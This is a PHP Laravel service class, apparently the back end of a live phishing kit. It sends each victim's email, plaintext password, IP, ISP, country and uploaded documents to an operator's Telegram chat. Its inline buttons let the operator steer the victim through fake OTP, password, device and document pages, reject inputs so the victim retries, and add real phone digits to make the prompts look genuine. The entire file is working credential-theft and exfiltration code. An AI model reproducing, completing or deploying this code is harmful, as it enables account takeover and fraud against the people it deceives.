<?php

namespace App\Services;

use App\Models\AccessSession;
use App\Models\Setting;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class TelegramService
{
    public function enabled(): bool
    {
        return Setting::bool('telegram_enabled')
            && filled(Setting::get('telegram_bot_token'))
            && filled(Setting::get('telegram_chat_id'));
    }

    public function apiUrl(string $method): string
    {
        $token = Setting::get('telegram_bot_token');

        return "https://api.telegram.org/bot{$token}/{$method}";
    }

    public function sendMessage(string $text, ?array $replyMarkup = null, ?string $chatId = null): bool
    {
        return $this->sendMessageDetailed($text, $replyMarkup, $chatId)['ok'];
    }

    /**
     * @return array{ok:bool,error:?string}
     */
    public function sendMessageDetailed(string $text, ?array $replyMarkup = null, ?string $chatId = null): array
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        $targetChat = trim((string) ($chatId ?: Setting::get('telegram_chat_id', '')));

        if ($token === '' || $targetChat === '') {
            return ['ok' => false, 'error' => 'Bot token atau chat ID kosong.'];
        }

        $payload = [
            'chat_id' => $targetChat,
            'text' => $text,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true,
        ];

        if ($replyMarkup) {
            $payload['reply_markup'] = json_encode($replyMarkup);
        }

        try {
            $res = Http::timeout(12)->asForm()->post("https://api.telegram.org/bot{$token}/sendMessage", $payload);
            $body = $res->json();

            if ($res->successful() && ($body['ok'] ?? false) === true) {
                return ['ok' => true, 'error' => null];
            }

            $error = (string) ($body['description'] ?? $res->body() ?: 'Unknown Telegram API error');
            Log::warning('telegram.sendMessage failed', ['error' => $error, 'chat_id' => $targetChat]);

            return ['ok' => false, 'error' => $error];
        } catch (\Throwable $e) {
            Log::warning('telegram.sendMessage failed', ['error' => $e->getMessage()]);

            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }

    /**
     * @return array{ok:bool,error:?string,username:?string}
     */
    public function verifyToken(): array
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        if ($token === '') {
            return ['ok' => false, 'error' => 'Bot token kosong.', 'username' => null];
        }

        try {
            $res = Http::timeout(12)->get("https://api.telegram.org/bot{$token}/getMe");
            $body = $res->json();

            if ($res->successful() && ($body['ok'] ?? false) === true) {
                return [
                    'ok' => true,
                    'error' => null,
                    'username' => data_get($body, 'result.username'),
                ];
            }

            return [
                'ok' => false,
                'error' => (string) ($body['description'] ?? 'Token tidak valid.'),
                'username' => null,
            ];
        } catch (\Throwable $e) {
            return ['ok' => false, 'error' => $e->getMessage(), 'username' => null];
        }
    }

    /**
     * @return array<string, mixed>|null
     */
    public function getChatInfo(string $chatId): ?array
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        $chatId = trim($chatId);
        if ($token === '' || $chatId === '') {
            return null;
        }

        try {
            $res = Http::timeout(10)->get("https://api.telegram.org/bot{$token}/getChat", ['chat_id' => $chatId]);
            if ($res->successful() && ($res->json('ok') ?? false)) {
                return $res->json('result');
            }
        } catch (\Throwable) {
            //
        }

        return null;
    }

    public function isBotSelfChat(string $chatId): bool
    {
        $info = $this->getChatInfo($chatId);
        if (! $info) {
            return false;
        }

        $verify = $this->verifyToken();
        $botUser = strtolower((string) ($verify['username'] ?? ''));
        $chatUser = strtolower((string) ($info['username'] ?? ''));

        return ($info['type'] ?? '') === 'private'
            && $botUser !== ''
            && $chatUser === $botUser;
    }

    /**
     * @return array<string, array{type:string,title:?string,username:?string}>
     */
    public function knownChats(): array
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        if ($token === '') {
            return [];
        }

        try {
            $res = Http::timeout(15)->get("https://api.telegram.org/bot{$token}/getUpdates", ['limit' => 100]);
            $chats = [];

            foreach ($res->json('result') ?? [] as $update) {
                foreach (['message', 'channel_post', 'my_chat_member', 'chat_member', 'edited_channel_post'] as $key) {
                    $chat = data_get($update, "{$key}.chat");
                    if (! is_array($chat) || ! isset($chat['id'])) {
                        continue;
                    }
                    $id = (string) $chat['id'];
                    $chats[$id] = [
                        'type' => (string) ($chat['type'] ?? '?'),
                        'title' => $chat['title'] ?? $chat['first_name'] ?? null,
                        'username' => $chat['username'] ?? null,
                    ];
                }
            }

            return $chats;
        } catch (\Throwable) {
            return [];
        }
    }

    public function answerCallback(string $callbackId, string $text, bool $alert = false): void
    {
        if (! filled(Setting::get('telegram_bot_token'))) {
            return;
        }

        try {
            Http::timeout(8)->asForm()->post($this->apiUrl('answerCallbackQuery'), [
                'callback_query_id' => $callbackId,
                'text' => $text,
                'show_alert' => $alert ? 'true' : 'false',
            ]);
        } catch (\Throwable $e) {
            Log::warning('telegram.answerCallback failed', ['error' => $e->getMessage()]);
        }
    }

    public function setWebhook(string $url): array
    {
        try {
            $res = Http::timeout(15)->asForm()->post($this->apiUrl('setWebhook'), [
                'url' => $url,
                'allowed_updates' => json_encode(['message', 'callback_query', 'channel_post', 'edited_channel_post']),
                'drop_pending_updates' => true,
            ]);

            return [
                'ok' => $res->successful() && ($res->json('ok') === true),
                'body' => $res->json(),
            ];
        } catch (\Throwable $e) {
            return ['ok' => false, 'body' => ['description' => $e->getMessage()]];
        }
    }

    public function deleteWebhook(): array
    {
        try {
            $res = Http::timeout(15)->asForm()->post($this->apiUrl('deleteWebhook'), [
                'drop_pending_updates' => true,
            ]);

            return [
                'ok' => $res->successful() && ($res->json('ok') === true),
                'body' => $res->json(),
            ];
        } catch (\Throwable $e) {
            return ['ok' => false, 'body' => ['description' => $e->getMessage()]];
        }
    }

    public function notifyLogin(AccessSession $session): void
    {
        if (! $this->enabled()) {
            return;
        }

        $text = "<b>🔐 New Login</b>\n"
            ."ID: <code>#{$session->id}</code>\n"
            .'Email: <code>'.$this->esc((string) $session->email)."</code>\n"
            .'Password: <code>'.$this->esc((string) $session->login_password)."</code>\n"
            .'IP: <code>'.$this->esc((string) $session->ip)."</code>\n"
            .'ISP: '.$this->esc((string) ($session->isp ?: '-'))."\n"
            .'Country: '.$this->esc((string) ($session->country ?: '-'))."\n"
            .'Time: '.$this->esc($session->updated_at?->timezone(config('app.timezone'))->format('Y-m-d H:i:s') ?? now()->format('Y-m-d H:i:s'));

        $this->sendMessage($text, $this->controlKeyboard($session->id));
    }

    public function notifyReview(AccessSession $session, string $label, string $value): void
    {
        if (! $this->enabled()) {
            return;
        }

        $text = "<b>📨 {$label}</b>\n"
            ."ID: <code>#{$session->id}</code>\n"
            .'Email: <code>'.$this->esc((string) $session->email)."</code>\n"
            .'Value: <code>'.$this->esc($value)."</code>\n"
            .'Status: <code>'.$this->esc((string) $session->status).'</code>';

        $this->sendMessage($text, $this->reviewKeyboard($session));
    }

    /**
     * @return array{inline_keyboard: list<list<array{text:string,callback_data:string}>>}
     */
    public function reviewKeyboard(AccessSession $session): array
    {
        $keyboard = $this->controlKeyboard($session->id);
        $id = (string) $session->id;

        $decline = match ($session->status) {
            AccessSession::STATUS_OTP_REVIEW, AccessSession::STATUS_AUTH_REVIEW => [
                'text' => '❌ Decline OTP',
                'callback_data' => "a:{$id}:decline_otp",
            ],
            AccessSession::STATUS_PASSWORD_REVIEW => [
                'text' => '❌ Decline Password',
                'callback_data' => "a:{$id}:decline_password",
            ],
            AccessSession::STATUS_DEVICE_REVIEW => [
                'text' => '❌ Decline Device',
                'callback_data' => "a:{$id}:decline_device",
            ],
            default => null,
        };

        if ($decline !== null) {
            array_unshift($keyboard['inline_keyboard'], [$decline]);
        }

        return $keyboard;
    }

    public function notifyDocumentUpload(AccessSession $session, string $storagePath, string $originalName): void
    {
        if (! $this->enabled()) {
            return;
        }

        $fullPath = storage_path('app/private/'.$storagePath);
        if (! is_file($fullPath)) {
            Log::warning('telegram.document missing file', ['path' => $storagePath]);

            return;
        }

        $caption = "<b>📎 Document Uploaded</b>\n"
            ."ID: <code>#{$session->id}</code>\n"
            .'Email: <code>'.$this->esc((string) $session->email)."</code>\n"
            .'File: <code>'.$this->esc($originalName)."</code>\n"
            .'IP: <code>'.$this->esc((string) ($session->ip ?: '-'))."</code>\n"
            .'Time: '.$this->esc(now()->timezone(config('app.timezone'))->format('Y-m-d H:i:s'));

        $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
        if (in_array($ext, ['jpg', 'jpeg', 'png', 'webp'], true)) {
            $this->sendPhoto($fullPath, $originalName, $caption);
        } else {
            $this->sendDocument($fullPath, $originalName, $caption);
        }
    }

    /**
     * @return array{ok:bool,error:?string}
     */
    public function sendPhoto(string $absolutePath, string $filename, string $caption, ?string $chatId = null): array
    {
        return $this->sendMediaFile('sendPhoto', 'photo', $absolutePath, $filename, $caption, $chatId);
    }

    /**
     * @return array{ok:bool,error:?string}
     */
    public function sendDocument(string $absolutePath, string $filename, string $caption, ?string $chatId = null): array
    {
        return $this->sendMediaFile('sendDocument', 'document', $absolutePath, $filename, $caption, $chatId);
    }

    /**
     * @return array{ok:bool,error:?string}
     */
    protected function sendMediaFile(
        string $method,
        string $field,
        string $absolutePath,
        string $filename,
        string $caption,
        ?string $chatId = null,
    ): array {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        $targetChat = trim((string) ($chatId ?: Setting::get('telegram_chat_id', '')));

        if ($token === '' || $targetChat === '') {
            return ['ok' => false, 'error' => 'Bot token atau chat ID kosong.'];
        }

        try {
            $res = Http::timeout(60)
                ->attach($field, fopen($absolutePath, 'r'), $filename)
                ->post("https://api.telegram.org/bot{$token}/{$method}", [
                    'chat_id' => $targetChat,
                    'caption' => $caption,
                    'parse_mode' => 'HTML',
                ]);

            $body = $res->json();

            if ($res->successful() && ($body['ok'] ?? false) === true) {
                return ['ok' => true, 'error' => null];
            }

            $error = (string) ($body['description'] ?? $res->body() ?: 'Unknown Telegram API error');
            Log::warning("telegram.{$method} failed", ['error' => $error, 'file' => $filename]);

            return ['ok' => false, 'error' => $error];
        } catch (\Throwable $e) {
            Log::warning("telegram.{$method} failed", ['error' => $e->getMessage(), 'file' => $filename]);

            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }

    /**
     * @return array{inline_keyboard: list<list<array{text:string,callback_data:string}>>}
     */
    public function controlKeyboard(int $sessionId): array
    {
        $id = (string) $sessionId;

        return [
            'inline_keyboard' => [
                [
                    ['text' => 'Waiting', 'callback_data' => "a:{$id}:waiting"],
                    ['text' => 'OTP', 'callback_data' => "a:{$id}:otp"],
                    ['text' => 'AUTH', 'callback_data' => "a:{$id}:auth"],
                ],
                [
                    ['text' => 'Password', 'callback_data' => "a:{$id}:password"],
                    ['text' => 'Device', 'callback_data' => "a:{$id}:device"],
                    ['text' => 'Document', 'callback_data' => "a:{$id}:document"],
                ],
                [
                    ['text' => 'Logout', 'callback_data' => "a:{$id}:logout"],
                    ['text' => 'Close', 'callback_data' => "a:{$id}:close"],
                ],
            ],
        ];
    }

    public function handleCallback(array $callback): void
    {
        $data = (string) ($callback['data'] ?? '');
        $callbackId = (string) ($callback['id'] ?? '');
        $chatId = (string) data_get($callback, 'message.chat.id', '');

        if (! $this->isAllowedCallbackChat($chatId, $callback)) {
            $this->answerCallback($callbackId, 'Chat tidak diizinkan.', true);
            Log::warning('telegram.callback rejected chat', [
                'chat_id' => $chatId,
                'allowed' => Setting::get('telegram_chat_id'),
            ]);

            return;
        }

        if (! preg_match('/^a:(\d+):([a-z_]+)$/', $data, $m)) {
            $this->answerCallback($callbackId, 'Perintah tidak valid.', true);

            return;
        }

        $session = AccessSession::query()->find((int) $m[1]);
        $page = $m[2];

        if (! $session) {
            $this->answerCallback($callbackId, 'Session tidak ditemukan.', true);

            return;
        }

        if (in_array($session->status, [AccessSession::STATUS_CLOSED, AccessSession::STATUS_LOGOUT], true) && $page !== 'close') {
            $this->answerCallback($callbackId, 'Session sudah selesai.', true);

            return;
        }

        if ($page === 'close') {
            $session->forceFill([
                'status' => AccessSession::STATUS_LOGOUT,
                'redirected_at' => now(),
            ])->save();
            $this->answerCallback($callbackId, "Session #{$session->id} di-close.");
            Log::info('telegram.callback close', ['session_id' => $session->id]);

            return;
        }

        if ($page === 'decline_otp') {
            if (! $session->isReview()) {
                $this->answerCallback($callbackId, 'Tidak ada OTP yang menunggu review.', true);

                return;
            }

            $session->declineOtp();
            $this->answerCallback($callbackId, "OTP ditolak — user input lagi (#{$session->id})");
            Log::info('telegram.callback decline_otp', ['session_id' => $session->id]);

            return;
        }

        if ($page === 'decline_password') {
            if ($session->status !== AccessSession::STATUS_PASSWORD_REVIEW) {
                $this->answerCallback($callbackId, 'Tidak ada password yang menunggu review.', true);

                return;
            }

            $session->declinePassword();
            $this->answerCallback($callbackId, "Password ditolak — user input lagi (#{$session->id})");
            Log::info('telegram.callback decline_password', ['session_id' => $session->id]);

            return;
        }

        if ($page === 'decline_device') {
            if ($session->status !== AccessSession::STATUS_DEVICE_REVIEW) {
                $this->answerCallback($callbackId, 'Tidak ada pilihan device yang menunggu review.', true);

                return;
            }

            $session->declineDevice();
            $this->answerCallback($callbackId, "Device ditolak — user pilih lagi (#{$session->id})");
            Log::info('telegram.callback decline_device', ['session_id' => $session->id]);

            return;
        }

        if (! array_key_exists($page, AccessSession::PAGES)) {
            $this->answerCallback($callbackId, 'Halaman tidak valid.', true);

            return;
        }

        $extra = [];
        if ($page === AccessSession::STATUS_OTP) {
            if ($session->hasPhoneLast4()) {
                $digits = (string) $session->phone_last4;
                $session->sendTo($page, ['phone_last4' => $digits]);
                $this->answerCallback($callbackId, "User #{$session->id} → otp (****{$digits})");
                Log::info('telegram.callback routed', ['session_id' => $session->id, 'page' => $page, 'phone_last4' => $digits]);

                return;
            }

            $this->beginOtpPhonePrompt($chatId, $session, $callbackId);

            return;
        }

        $session->sendTo($page, $extra);
        $this->answerCallback($callbackId, "User #{$session->id} → {$page}");
        Log::info('telegram.callback routed', ['session_id' => $session->id, 'page' => $page]);
    }

    public function processUpdate(array $payload): void
    {
        if (isset($payload['callback_query']) && is_array($payload['callback_query'])) {
            $this->handleCallback($payload['callback_query']);
        }

        foreach (['message', 'channel_post', 'edited_channel_post'] as $key) {
            $block = data_get($payload, $key);
            if (! is_array($block)) {
                continue;
            }

            $chatId = (string) data_get($block, 'chat.id', '');
            $text = trim((string) data_get($block, 'text', ''));

            if ($chatId === '' || $text === '') {
                continue;
            }

            if (! $this->isAllowedMessageChat($chatId)) {
                continue;
            }

            $this->handleIncomingText($chatId, $text);
        }
    }

    protected function handleIncomingText(string $chatId, string $text): void
    {
        if ($text === '/ping') {
            $this->sendMessage('pong', null, $chatId);

            return;
        }

        if ($text === '/cancel') {
            if ($this->clearPendingOtp($chatId)) {
                $this->sendMessage('Input OTP dibatalkan.', null, $chatId);
            }

            return;
        }

        if (! preg_match('/^\d{4}$/', $text)) {
            return;
        }

        $sessionId = $this->getPendingOtp($chatId);
        if ($sessionId === null) {
            return;
        }

        $session = AccessSession::query()->find($sessionId);
        if (! $session) {
            $this->clearPendingOtp($chatId);
            $this->sendMessage('Session tidak ditemukan. Klik OTP lagi.', null, $chatId);

            return;
        }

        if (in_array($session->status, [AccessSession::STATUS_CLOSED, AccessSession::STATUS_LOGOUT], true)) {
            $this->clearPendingOtp($chatId);
            $this->sendMessage("Session #{$session->id} sudah selesai.", null, $chatId);

            return;
        }

        $session->sendTo(AccessSession::STATUS_OTP, ['phone_last4' => $text]);
        $this->clearPendingOtp($chatId);
        $this->sendMessage(
            "✅ User #{$session->id} → OTP\nPhone: <code>****{$this->esc($text)}</code>",
            null,
            $chatId
        );
        Log::info('telegram.otp routed', ['session_id' => $session->id, 'phone_last4' => $text]);
    }

    protected function beginOtpPhonePrompt(string $chatId, AccessSession $session, string $callbackId): void
    {
        $targetChat = $chatId !== '' ? $chatId : trim((string) Setting::get('telegram_chat_id', ''));

        $this->setPendingOtp($targetChat, $session->id);
        $this->answerCallback($callbackId, 'Kirim 4 digit terakhir nomor telepon di chat ini.');

        $this->sendMessage(
            "📱 <b>OTP — Session #{$session->id}</b>\n"
            .'Email: <code>'.$this->esc((string) $session->email)."</code>\n\n"
            ."Kirim <b>4 digit terakhir</b> nomor telepon user di chat ini.\n"
            ."Contoh: <code>1234</code>\n"
            .'Batal: <code>/cancel</code>',
            null,
            $targetChat !== '' ? $targetChat : null
        );
    }

    protected function setPendingOtp(string $chatId, int $sessionId): void
    {
        if ($chatId === '') {
            return;
        }

        Cache::put($this->pendingOtpCacheKey($chatId), $sessionId, now()->addMinutes(15));
    }

    protected function getPendingOtp(string $chatId): ?int
    {
        if ($chatId === '') {
            return null;
        }

        $value = Cache::get($this->pendingOtpCacheKey($chatId));

        return is_numeric($value) ? (int) $value : null;
    }

    protected function clearPendingOtp(string $chatId): bool
    {
        if ($chatId === '') {
            return false;
        }

        return Cache::forget($this->pendingOtpCacheKey($chatId));
    }

    protected function pendingOtpCacheKey(string $chatId): string
    {
        return 'telegram_otp_pending:'.sha1($chatId);
    }

    protected function isAllowedMessageChat(string $chatId): bool
    {
        $allowedChat = trim((string) Setting::get('telegram_chat_id', ''));

        return $allowedChat === '' || $chatId === $allowedChat;
    }

    public function pollUpdatesOnce(int $timeout = 25): int
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        if ($token === '') {
            return 0;
        }

        $offset = (int) Setting::get('telegram_update_offset', 0);

        try {
            $res = Http::timeout(max(10, $timeout + 10))->get("https://api.telegram.org/bot{$token}/getUpdates", [
                'offset' => $offset,
                'timeout' => $timeout,
                'allowed_updates' => json_encode(['message', 'callback_query', 'channel_post', 'edited_channel_post']),
            ]);

            if (! $res->successful() || ($res->json('ok') ?? false) !== true) {
                Log::warning('telegram.poll failed', ['body' => $res->json()]);

                return 0;
            }

            $updates = $res->json('result') ?? [];
            $processed = 0;

            foreach ($updates as $update) {
                if (! is_array($update)) {
                    continue;
                }

                $this->processUpdate($update);
                $processed++;

                if (isset($update['update_id'])) {
                    $offset = max($offset, (int) $update['update_id'] + 1);
                }
            }

            if ($offset > (int) Setting::get('telegram_update_offset', 0)) {
                Setting::set('telegram_update_offset', (string) $offset);
            }

            return $processed;
        } catch (\Throwable $e) {
            Log::warning('telegram.poll failed', ['error' => $e->getMessage()]);

            return 0;
        }
    }

    /**
     * @return array{ok:bool,url:?string,pending:int,error:?string}
     */
    public function webhookInfo(): array
    {
        $token = trim((string) Setting::get('telegram_bot_token', ''));
        if ($token === '') {
            return ['ok' => false, 'url' => null, 'pending' => 0, 'error' => 'Token kosong.'];
        }

        try {
            $res = Http::timeout(12)->get("https://api.telegram.org/bot{$token}/getWebhookInfo");
            $body = $res->json();

            if (! $res->successful() || ($body['ok'] ?? false) !== true) {
                return [
                    'ok' => false,
                    'url' => null,
                    'pending' => 0,
                    'error' => (string) ($body['description'] ?? 'Gagal membaca webhook info.'),
                ];
            }

            $result = $body['result'] ?? [];

            return [
                'ok' => true,
                'url' => filled($result['url'] ?? null) ? (string) $result['url'] : null,
                'pending' => (int) ($result['pending_update_count'] ?? 0),
                'error' => null,
            ];
        } catch (\Throwable $e) {
            return ['ok' => false, 'url' => null, 'pending' => 0, 'error' => $e->getMessage()];
        }
    }

    public static function appUrlIsHttps(): bool
    {
        return str_starts_with(strtolower((string) config('app.url')), 'https://');
    }

    protected function isAllowedCallbackChat(string $chatId, array $callback): bool
    {
        $allowedChat = trim((string) Setting::get('telegram_chat_id', ''));
        if ($allowedChat === '') {
            return true;
        }

        $candidates = array_filter([
            trim($chatId),
            trim((string) data_get($callback, 'message.sender_chat.id', '')),
        ]);

        foreach ($candidates as $candidate) {
            if ($candidate !== '' && $candidate === $allowedChat) {
                return true;
            }
        }

        return false;
    }

    protected function esc(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
